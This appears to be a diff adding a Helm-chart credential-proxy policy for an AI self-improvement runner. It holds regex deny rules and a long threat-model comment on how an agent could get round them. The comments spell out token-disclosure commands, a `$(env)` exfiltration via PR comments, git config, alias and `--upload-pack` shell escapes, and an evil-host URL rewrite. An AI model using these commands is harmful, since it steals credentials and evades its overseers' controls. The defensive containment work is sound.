+            - name: kube-api-access
+              projected:
+                defaultMode: 0444
+                sources:
+                  - serviceAccountToken:
+                      expirationSeconds: 3600
+                      path: token
+                  - configMap:
+                      name: kube-root-ca.crt
+                      items:
+                        - key: ca.crt
+                          path: ca.crt
+                  - downwardAPI:
+                      items:
+                        - path: namespace
+                          fieldRef:
+                            apiVersion: v1
+                            fieldPath: metadata.namespace
+            {{- if $needsForge }}
+            - name: credential-proxy-policy
+              configMap:
+                name: {{ $name }}-credential-proxy-policy
+            - name: credential-proxy-tmp
+              emptyDir:
+                sizeLimit: 1Gi
+            - name: credential-proxy-state
+              emptyDir:
+                sizeLimit: 2Gi
+            - name: credential-proxy-runtime
+              emptyDir:
+                medium: Memory
+                sizeLimit: 16Mi
+            # Not created by this chart. `optional: false` is the default and
+            # is left that way on purpose: a missing Secret holds the pod in
+            # CreateContainerConfigError, which is loud, rather than starting a
+            # run that investigates for an hour and then cannot file. The
+            # render-time check at the top of this file is the earlier version
+            # of the same answer, and catches the ordinary case.
+            - name: selfimprove-github-pat
+              secret:
+                secretName: {{ $si.github.patSecret | quote }}
+                # 0440, not 0400. A Secret volume is owned by root and by the
+                # pod's fsGroup, and both containers run as uid 10000 -- so
+                # owner-only read is unreadable by the process that needs it.
+                # The pod comes up either way: bash cannot open the redirect,
+                # the `|| echo` records that in the bootstrap log, and `; true`
+                # leaves the sidecar running with no GitHub identity until the
+                # runner's preflight reads the log back and says so.
+                defaultMode: 0440
+                items:
+                  - key: {{ $patKey | quote }}
+                    path: {{ $patKey | quote }}
+            - name: credential-proxy-ksa-token
+              projected:
+                sources:
+                  - serviceAccountToken:
+                      audience: kubeagents-credential-proxy
+                      expirationSeconds: 3600
+                      path: token
+            {{- end }}
+{{- if $needsForge }}
+---
+# The argv deny-rules for the runner's proxy, in the schema `Policy.load`
+# actually reads (agents/platform/scripts/credential_proxy.py): `blockedMessage`
+# and `rules`, each rule a regex matched against the joined argv. Any other
+# top-level key is ignored, so a file that expresses its intent in the wrong
+# shape parses cleanly, yields zero rules, and blocks nothing -- which is what
+# this ConfigMap used to do while its comment claimed the opposite.
+#
+# The first eight of the nineteen started as the set the operator installs for the
+# Platform Agent's own proxy (credentialProxyPolicyJSON in
+# k8s-operator/internal/controller/platformagent_manifests.go). They matter more
+# here than there: this proxy holds a GitHub token with write scope, and
+# `gh auth token` prints it to stdout, where it becomes part of an /v1/exec
+# response body the model reads. `command_policy.py` cannot cover that -- it
+# governs kubectl and gcloud only and returns "allowed" for every other tool, on
+# purpose -- so these rules are the only thing standing between the model and
+# the credential.
+#
+# It is a copy, and nothing checks that it stays one -- unlike the CRD and RBAC
+# copies, which `make chart-check` mirrors. It diverges on purpose in two ways.
+#
+# `github.token-disclosure` here also matches `gh auth status -t`, the
+# documented shorthand for `--show-token` that the operator's copy misses.
+#
+# Every rule here also walks whole argv tokens where the operator's copy walks
+# whitespace. `Policy.blocked_by` matches against `shlex.join(argv)`, so a token
+# containing spaces arrives single-quoted, and `(?:\s+\S+)*?` reads straight
+# through the quotes into its words. That is harmless for a Platform Agent whose
+# argv is mostly flags; it is not harmless here, because this pod's one write is
+# `gh pr create --title '<a sentence about a bug in kube-agents>'`. Titles of
+# that shape hit `no-merge-or-approve` on `close`, `secret`, `workflow` or
+# `release` and the operator's `github.token-disclosure` on any title pairing
+# `auth` with `token` -- the pull request the whole loop exists to open, refused
+# by its own guard rail, hourly, with a message about merging. So the traversal
+# is `(?:\s+(?:'[^']*'|"[^"]*"|[^'"\s])+)*?`: a quoted run is consumed whole and
+# cannot be read into, and `\A` stops a match beginning inside one. The rules
+# mean what they meant; they now mean it about argv rather than about characters.
+#
+# Two things about that token unit are load-bearing.
+#
+# The outer `+` glues adjacent quoted and bare runs into one token, because
+# `shlex.join` writes an argument containing an apostrophe as a mixture of both
+# quote characters -- `o'r` becomes `'o'"'"'r'`. An alternation of single runs
+# stops at the first such argument, so with the earlier form one apostrophe
+# anywhere ahead of the keyword made every rule here miss: `gh -R "o'r/x" auth
+# token` walked past the guard.
+#
+# The bare-character branch is one character rather than `[^'"\s]+`. Under a `+`
+# a greedy run is ambiguous -- an n-character word splits across repetitions
+# 2^(n-1) ways -- and a rule that ends up not matching tries all of them.
+# Measured on CPython: 37ms for a single 8-character token and over 3s for an
+# 8-token argv, against 0.01ms for the form below. Since the proxy runs
+# `Policy.blocked_by` on the request path with argv the model chose, that is a
+# hang the model can ask for. Each branch consumes a fixed, unambiguous amount,
+# so a token has one parse and the walk stays linear.
+#
+# The last eleven are specific to this pod.
+#
+#   - The runner has no cluster or project it is allowed to mutate, so kubectl
+#     and gcloud are refused outright rather than allow-listed down to nothing.
+#     `\A` rather than `^` because the patterns are compiled with re.MULTILINE.
+#   - The loop's job ends at opening a pull request. Its upstream token carries
+#     `pull_requests: write`, which is enough to approve and merge its own --
+#     the one grant in this design that could turn a finding into a change
+#     nobody read. Creating is not blocked; merging, approving, closing and the
+#     release/secret/workflow surfaces are. `comment` is in that list for the
+#     reason the issue rule already gave for its own `comment`: it writes to a
+#     conversation this loop does not own. It was the cheapest exfiltration
+#     primitive in the set -- `gh pr comment --repo <anywhere> --body "$(env)"`
+#     is one call, and §6.4 is explicit that the credential is a classic token
+#     carrying `repo` on every repository the robot account can reach, so
+#     "anywhere" is not a figure of speech. The loop never comments; the two
+#     writes it makes are `create` and `edit --add-label`.
+#   - Which leaves the two spellings of that same primitive that survive a
+#     blocked `comment`.
+#     `gh-pr-edit-metadata-only` refuses `gh pr edit` carrying `--body`,
+#     `--body-file`, `--title` or `--base` (and their short forms). The loop
+#     runs exactly one shape of that command -- `gh pr edit <url> --add-label
+#     '<name>'`, one call per label, and the prompt at selfimprove_run.py says
+#     why -- so a body or a title on it is not the loop doing its job. Without
+#     the rule, an `edit --body` on a pull request in another repository is the
+#     `comment` primitive again with one more step.
+#     `gh-target-allowlist` is the other half: `-R`/`--repo` naming a
+#     repository that is neither the configured upstream nor the configured
+#     fork. `gh pr create --repo <attacker>/kube-agents --head <robot>:<branch>
+#     --body ...` is legal against any fork of the upstream, which is a set
+#     anybody can join by clicking Fork, so the fork network is not the
+#     constraint it looks like. The two allowed slugs are interpolated rather
+#     than hardcoded because both are install-configurable; they are the only
+#     Go template actions inside the policy block, and
+#     `test_selfimprove_policy.py` knows them by name and fails if a third
+#     appears. `-R` is matched attached as well as separated, because
+#     `-R<slug>` is how pflag also spells it and a rule that reads only
+#     `-R <slug>` is a rule with a documented bypass.
+#   - The same argument applied to `repo` and `issue`, which the allow-list
+#     admits and nothing then looked at the verb under. The list exists so the
+#     loop can confirm its fork and check for prior art -- both reads -- but a
+#     bare noun admits the whole subtree, so `gh repo delete`, `gh repo edit
+#     --visibility public`, `gh repo deploy-key add`, `gh issue delete` and
+#     `gh issue transfer` were permitted by the rule whose comment said "to
+#     confirm the fork". Both are now allow-listed down to their read verbs.
+#     The flag-skip inside the lookahead is what keeps `gh -R o/r repo view`
+#     working, and it sits inside one lookahead rather than beside it: written
+#     as `\s+repo(?:\s+-\S+)*(?!\s+view)` the engine backtracks the flag-skip to
+#     zero repetitions and the negative lookahead then succeeds against the
+#     flag, refusing the read it was written to permit.
+#   - `gh api` is the hole under the other two. `gh api` mutates without an
+#     explicit method whenever `-f`, `-F`, `--raw-field` or `--input` is present,
+#     and `gh api graphql -f query='mutation{...}'` mutates with none of the REST
+#     verbs in sight, so a rule that enumerates mutating shapes will keep missing
+#     one. It is refused whatever the method instead. Nothing the loop does needs
+#     it: the filing skill reads GitHub through the public search endpoint and
+#     writes through `gh pr create`.
+#   - `gh alias` is how every rule above gets spelled around. gh expands an alias
+#     from its own config before dispatch, so `gh alias set t 'auth token'`
+#     followed by `gh t` reaches the token with an argv no rule here matches --
+#     and because the alias lands in the config under
+#     CREDENTIAL_PROXY_STATE_DIR, it survives into later turns and later runs.
+#     Setting one is refused.
+#   - And the subcommand is allow-listed, which is what closes the alias hole
+#     rather than merely making it harder to open: an alias is by construction a
+#     name outside the list. The list is what the loop uses -- `pr` to create and
+#     read, `search` and `issue` for the prior-art check the filing skill's sec. 0
+#     requires, `repo` to confirm the fork -- not an inventory of gh's commands,
+#     so a gh upgrade does not silently widen it and `gh gist`, `gh codespace`
+#     and `gh extension exec` are refused without needing a rule each.
+#     The second arm is not redundant: gh accepts `-R`/`--repo` before the
+#     subcommand as readily as after it (cobra interspersing, checked against gh
+#     2.97.0), so a rule reading only the word after `gh` sees the flag and stops,
+#     and `gh -R o/r <alias>` walks straight through. It is gh's only global flag
+#     that takes a value, so one extra arm is the whole fix. The separator after
+#     the flag is optional, because a short flag's value may be attached to it:
+#     `-Ro/r` is one argv token with neither a space nor an `=` in it, so an arm
+#     requiring `(?:\s+|=)` missed it while arm one's `(?!-)` suppressed itself
+#     on the leading dash -- and `gh -Ro/r label delete x` reached gh unread.
+#   - `git -c <key>=<value>` is arbitrary shell. git executes `alias.*`,
+#     `core.pager`, `core.hooksPath` and `credential.helper` values beginning `!`
+#     as commands, so `git -c alias.z='!gh auth token' z` prints the token and
+#     `git -c alias.z='!kubectl get cm -A -o yaml' z` walks around
+#     `no-cluster-tools` into the cluster with the pod's mounted KSA token. The
+#     rule matches `-c`/`--config-env` only when a dotted key with a value
+#     follows, which is what leaves `git switch -c selfimprove/<slug>` -- the
+#     branch the filing turn creates -- alone. `git config` is refused outright;
+#     the proxy injects the identity the commit needs
+#     (credential_proxy.py, DEFAULT_GIT_AUTHOR_NAME) so the runner never sets it.
+#
+#     The key is read as `[^'"\s=]*\.[^'"\s=]*` rather than as dot-separated
+#     words, because git's three-part keys put a URL in the middle and a URL is
+#     not a word: `credential.https://github.com.helper=!sh -c '...'` and
+#     `url.https://evil/.insteadOf=https://github.com/` both parse as keys to
+#     git and matched nothing under the narrower charset. `(?![/~])` keeps the
+#     widened charset off `-C <path>`, which the rules see as the same flag
+#     because they are compiled with re.IGNORECASE.
+#   - `git push` had no rule at all, so the one write this pod is built around
+#     was constrained only by what the token could reach -- and a robot account
+#     with push access to a fork of kube-agents has push access to its own
+#     branches on it. `git push --force origin main` and `git push
+#     https://github.com/gke-labs/kube-agents HEAD:main` were both permitted.
+#     The rule allows exactly the remote named `fork`, which is the name the
+#     runner gives it and the name the filing skill pushes to. `send-pack` and
+#     `http-push` are the plumbing spellings of the same operation and take a
+#     URL directly, so they are refused outright.
+#   - `git remote set-url` is the answer to the rule above, so it is refused
+#     with `rename`, `remove` and `rm`. `git remote add` is not: the runner
+#     builds its checkout with it. That leaves one residual this file cannot
+#     close -- `git init` into a second directory under the leased tree, then
+#     `git remote add fork <any url>` -- because every ingredient is a call the
+#     runner itself makes. What is left of the constraint there is the token's
+#     own scope, which is the reason `mode: fork` exists.
+#   - `--exec-path`, `--upload-pack`, `--receive-pack`, `--exec` and `ext::`
+#     are code execution in the container that mounts the PAT.
+#     `git --exec-path=/home/selfimprove/x pwn` runs `/home/selfimprove/x/git-pwn`,
+#     and the filing turn writes to `/home/selfimprove` by design
+#     (HERMES_WRITE_SAFE_ROOT); `git ls-remote --upload-pack='sh -c "..."' .`
+#     runs its argument through a shell on the local transport. None of the five
+#     is a mutating git subcommand, so the proxy's own `.lease` floor
+#     (GIT_MUTATING_SUBCOMMANDS in credential_proxy.py) does not see them either.
+#     The rule reads them after the traversal rather than at argv[1], because
+#     git accepts its global flags in any order and `git -C /src --exec-path=...`
+#     is the same escape one token further along. The leading `'?` is for
+#     `shlex.join`: a value with a space in it arrives quoted, and the quote sits
+#     between the whitespace and the flag.
+#   - Everything above this line is a denylist, and `gh` was the only one of the
+#     two tools that also had an allow-list. So the rules said which `git`
+#     subcommands may not run and nothing about which may -- and git has around
+#     150 of them. `git hash-object -w <path>`, `git cat-file -p <sha>`,
+#     `git grep -f <path>` and `git archive -o <path>` each take a path or an
+#     object and print or store the contents, `/v1/exec` returns stdout to the
+#     caller unredacted, and this is the one container that mounts the PAT.
+#     `unlisted-git-subcommand` is the same shape as the gh rule: skip the global
+#     flags, then require the first word after them to be one the loop actually
+#     runs. It is last in the list so that a command a narrower rule already
+#     names -- `send-pack`, `clone`, `ls-remote` -- still reports that rule's id
+#     and its explanation rather than this one's.
+#     Two details it cannot be written without. The flag-skip has to consume
+#     `-C <path>` and its value together, because an engine free to treat `-C` as
+#     a valueless flag reads the path as the subcommand and refuses
+#     `git -C /src status`; the value-taking names are therefore listed once as
+#     the first alternative and excluded from the second by lookahead. And the
+#     allow-list terminates on `(?![\w-])` rather than `\b`, because `\b` sits
+#     happily between `show` and the `-` of `show-ref` -- which would admit
+#     `checkout-index --prefix=/tmp -a` on the strength of `checkout`.
+{{- /*
+The two repository slugs `selfimprove.gh-target-allowlist` admits, escaped for
+use inside a regular expression inside a JSON string. `.` is the only character
+GitHub permits in an owner or a repository name that means something to a regex,
+so one `replace` covers it; the doubled backslash is the JSON escape, which
+decodes to the single one the pattern needs. They are the only two Go template
+actions inside the policy block, and `test_selfimprove_policy.py` substitutes
+them by name and fails on a third -- so a rule that grows another one has to
+teach the test about it rather than silently rendering `{{` into a pattern.
+*/ -}}
+{{- $upstreamRe := $upstreamRepo | replace "." "\\\\." }}
+{{- $forkRe := $si.github.forkRepo | replace "." "\\\\." }}
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: {{ $name }}-credential-proxy-policy
+  namespace: {{ $ns }}
+  labels:
+    {{- include "kube-agents.labels" . | nindent 4 }}
+    app.kubernetes.io/name: kube-agents-selfimprove
+data:
+  policy.json: |
+    {
+      "apiVersion": "cli.proxy.kubeagents.io/v1alpha1",
+      "blockedMessage": "Command blocked: the self-improvement runner may not read or replace its own credentials.",
+      "rules": [
+        {"id":"gcp.access-token-disclosure","pattern":"\\Agcloud\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+auth\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+print-(?:access|identity)-token\\b"},
+        {"id":"gcp.config-helper-disclosure","pattern":"\\Agcloud\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+config\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+config-helper\\b"},
+        {"id":"github.token-disclosure","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+auth\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+token\\b|\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+auth\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+status\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:--show-token|-t)(?=\\s|$)"},
+        {"id":"kubernetes.token-disclosure","pattern":"\\Akubectl\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+create\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+token\\b|\\Akubectl\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+config\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+view\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+--raw\\b"},
+        {"id":"git.credential-disclosure","pattern":"\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+credential\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+fill\\b"},
+        {"id":"gcp.credential-replacement","pattern":"\\Agcloud\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+auth\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:login|activate-service-account)\\b"},
+        {"id":"github.credential-replacement","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+auth\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:login|refresh|switch|logout)\\b"},
+        {"id":"tool.self-modification","pattern":"\\Agcloud\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+components\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:install|update|remove)\\b|\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+extension\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:install|upgrade|remove)\\b"},
+        {"id":"selfimprove.no-cluster-tools","pattern":"\\A\\s*(?:kubectl|gcloud)\\b","message":"Command blocked: the self-improvement runner has no cluster or project write path. Use the read-only evidence CLI."},
+        {"id":"selfimprove.no-merge-or-approve","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+pr\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:merge|review|close|reopen|ready|lock|unlock)\\b|\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:release|secret|variable|workflow|ruleset)\\b|\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+pr\\b(?:\\s+(?:-R|--repo)\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+|\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+comment\\b","message":"Command blocked: the self-improvement runner opens pull requests and does nothing else to them. Merging, approving or closing one is a human's decision, and a comment writes to a conversation this loop does not own."},
+        {"id":"selfimprove.gh-pr-edit-metadata-only","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+pr\\b(?:\\s+(?:-R|--repo)\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+|\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+edit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:--(?:body|body-file|title|base)(?:=|\\s|$)|-[bft](?:$|[^-]))","message":"Command blocked: the self-improvement runner runs one shape of `gh pr edit` -- `--add-label`, one call per label, as the filing skill's sec. 7 lists it. `--body`, `--body-file`, `--title` and `--base` rewrite a pull request that is already open, which is a comment by another spelling."},
+        {"id":"selfimprove.gh-repo-reads-only","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+repo(?=\\s|$)(?!(?:\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+(?:view|list)(?=\\s|$))","message":"Command blocked: the self-improvement runner reads repository metadata to confirm its fork exists, and does nothing else to a repository. `gh repo view` and `gh repo list` are permitted; `delete`, `edit`, `archive`, `unarchive`, `rename`, `fork`, `sync`, `set-default` and `deploy-key` change the repository itself, which no finding requires."},
+        {"id":"selfimprove.gh-issue-reads-only","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+issue\\b(?!(?:\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+(?:view|list|status)(?=\\s|$))","message":"Command blocked: the self-improvement runner reads issues for the prior-art check the filing skill's sec. 0 requires, and files nothing there. `gh issue view`, `list` and `status` are permitted; `close`, `delete`, `edit`, `transfer`, `comment`, `pin` and `lock` write to a tracker this loop does not own."},
+        {"id":"selfimprove.no-raw-api","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+api\\b","message":"Command blocked: the self-improvement runner reaches GitHub through gh's own subcommands. A raw API call is a write path the argv rules cannot read, so it is refused whatever the method."},
+        {"id":"selfimprove.no-gh-alias","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+alias\\b","message":"Command blocked: gh expands aliases from its config before dispatch, so an alias is a way to spell a refused command that the argv rules never see. The runner has no use for one."},
+        {"id":"selfimprove.unlisted-gh-subcommand","pattern":"\\Agh\\s+(?!-)(?!(?:pr|search|issue|repo|version|help)\\b)|\\Agh\\s+(?:-R|--repo)(?:\\s+|=)?(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+\\s+(?!(?:pr|search|issue|repo|version|help)\\b)","message":"Command blocked: the self-improvement runner uses gh for pull requests, search, issues and repository reads, and nothing else. A name outside that set is either a subcommand it has no business running or an alias, and an alias resolves to a command these rules have already read and refused."},
+        {"id":"selfimprove.gh-target-allowlist","pattern":"\\Agh\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:-R(?![\\s=])|(?:-R|--repo)(?:=|\\s+)(?=\\S))(?!'?(?:{{ $upstreamRe }}|{{ $forkRe }})'?(?=\\s|$))","message":"Command blocked: the self-improvement loop reads and writes two repositories -- the upstream it files against and the fork it pushes branches to -- and `-R`/`--repo` naming a third points a credential that reaches every repository this account can see at one nobody configured. Drop the flag or name one of the two from your brief."},
+        {"id":"selfimprove.no-git-config-injection","pattern":"\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+config\\b|\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:-c|--config-env)(?:\\s+|=)'?(?![/~])[^'\"\\s=]*\\.[^'\"\\s=]*=","message":"Command blocked: git runs `alias.*`, `core.pager`, `core.hooksPath` and `credential.helper` as shell commands, so a config assignment is arbitrary execution wearing a flag. `git switch -c <branch>` is unaffected -- this reads only a dotted key with a value."},
+        {"id":"selfimprove.git-push-fork-only","pattern":"\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+push\\b(?!(?:\\s+-(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])*)*\\s+fork(?=\\s|$))|\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:send-pack|http-push)\\b","message":"Command blocked: the self-improvement loop pushes to the remote named `fork` and nowhere else. The runner creates that remote itself (selfimprove_run.py, _fetch_source_git) and the filing skill pushes `git push -u fork HEAD`; a push naming another remote, a URL, or no remote at all writes to a repository this loop does not own -- `origin` in upstream mode is the upstream repository."},
+        {"id":"selfimprove.no-git-remote-repoint","pattern":"\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+remote\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:set-url|rename|remove|rm)\\b","message":"Command blocked: the rule above constrains pushes to the remote named `fork`, and re-pointing that name at another repository is how a name-based constraint gets spelled around. The runner only ever adds remotes to a tree it has just created; it never re-points or removes one."},
+        {"id":"selfimprove.no-git-exec-flags","pattern":"\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+'?--(?:exec-path|upload-pack|receive-pack|exec)(?:=|\\s|$)|\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+(?:ls-remote|clone|fetch|pull|archive)\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+-u(?:=|\\s|$)|\\Agit\\b(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+)*?\\s+'?ext::","message":"Command blocked: each of these flags hands git a program to run. `--exec-path` puts a directory of attacker-written binaries ahead of git's own subcommands, `--upload-pack`/`--receive-pack` and their `-u` short form are passed to a shell on a local transport, `--exec` runs a command per rebase step, and an `ext::` URL is a command by construction. The loop's four git calls need none of them."},
+        {"id":"selfimprove.unlisted-git-subcommand","pattern":"\\Agit\\b(?:\\s+(?:-C|--git-dir|--work-tree|--namespace|--exec-path|-c|--config-env|--super-prefix|--attr-source)(?:=|\\s+)?(?:'[^']*'|\"[^\"]*\"|[^'\"\\s])+|\\s+(?!(?:-C|--git-dir|--work-tree|--namespace|--exec-path|-c|--config-env|--super-prefix|--attr-source)(?:=|\\s|$))-[^'\"\\s]*)*\\s+(?!-)(?!'?(?:add|blame|branch|checkout|commit|describe|diff|fetch|help|init|log|ls-files|merge-base|push|remote|restore|rev-parse|show|status|switch|version)(?![\\w-]))","message":"Command blocked: the self-improvement loop builds a checkout, writes one commit and pushes it, and reads the tree to decide what to write. A git subcommand outside that set is one nothing in the loop runs. `hash-object`, `cat-file`, `grep` and `archive` in particular take a path or a hash and print the contents back, in the one container that mounts the credential."}
+      ]
+    }
+{{- end }}
+{{- end }}
